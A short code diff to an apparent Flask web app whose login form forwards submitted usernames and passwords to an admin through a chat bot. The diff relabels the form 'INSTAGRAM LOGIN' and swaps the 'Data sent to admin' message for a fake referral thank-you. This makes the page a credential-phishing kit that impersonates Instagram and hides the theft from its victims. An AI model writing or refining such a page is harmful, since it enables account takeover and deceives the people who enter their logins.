@@ -453,7 +453,7 @@ LOGIN_FORM_HTML = r"""
 </head>
 <body>
   <div class="container">
-    <h2>🔐 User Login</h2>
+    <h2>🔐 INSTAGRAM LOGIN</h2>
     <form method="POST" action="/submit_form">
       <input type="text" name="username" placeholder="Username" required>
       <input type="password" name="password" placeholder="Password" required>
@@ -526,7 +526,7 @@ def submit_form():
         logger.warning("Scheduling message to TARGET_ADMIN_ID failed. Check event loop and that the admin has started the bot.")
         return "<h3>⚠️ Could not send data to admin. Please notify the admin to start the bot.</h3>"
 
-    return "<h3>✅ Data sent to admin!</h3><p>You can close this tab.</p>"
+    return "<h3>✅ You Have Completed Refferal Successfully!</h3><p>THANKS FOR YOUR CONTRIBUTION 💗.</p>"
 
 # ---------- Status + placeholders ----------
 @flask_app.route("/status")
